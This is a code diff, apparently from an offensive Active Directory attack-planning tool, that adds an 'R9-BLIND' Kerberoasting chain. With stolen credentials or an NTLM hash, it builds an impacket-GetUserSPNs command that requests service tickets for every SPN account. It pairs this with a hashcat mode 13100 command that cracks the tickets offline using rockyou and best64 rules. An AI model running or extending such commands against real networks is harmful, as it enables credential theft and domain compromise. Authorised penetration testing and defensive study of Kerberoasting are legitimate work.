@@ -616,6 +616,26 @@ def run(report, store, ui=None):
                       f"{_kb_uri}{_kb_hash_flag}",
                       f"hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
             src="bloodhound"))
+    # iter-132: R9-BLIND - operator has owned creds but no BloodHound to
+    # tell us WHICH users have an SPN. impacket-GetUserSPNs without a
+    # -request-user filter enumerates every user with an SPN via LDAP
+    # then requests a TGS for each. One command dumps everything. Fires
+    # only when e.kerberoastable is empty (R9 loop didn't emit) AND we
+    # have real auth (not placeholders).
+    if not e.kerberoastable and (_kb_hash or _kb_owner != "<owned-user>"):
+        _kb_uri_b = (f"'{_dom_sh_r9}/{_kb_owner_sh}'" if _kb_hash
+                     else f"'{_dom_sh_r9}/{_kb_owner_sh}:{_kb_pw_sh}'")
+        _kb_hf_b = (f" -hashes 'aad3b435b51404eeaad3b435b51404ee:{_kb_hash}'"
+                    if _kb_hash else "")
+        chains.append(Chain("R9-BLIND", "kerberoast (all SPN users)",
+            f"enumerate + request TGS for every SPN user via {_kb_owner}",
+            crit=6, conf=0.7, ready=0.7, prox=max(0.7, _prox(store, dc())),
+            commands=[f"impacket-GetUserSPNs -dc-ip {dc()} "
+                      f"{_kb_uri_b}{_kb_hf_b} -request "
+                      f"-outputfile tgs.txt   "
+                      f"# enumerates via LDAP; requests TGS per SPN owner",
+                      f"hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
+            src="users.txt"))
     if e.has_tgs:
         s, l = e.tgs_src
         # iter-80: use the real path to the hash file so operator doesn't
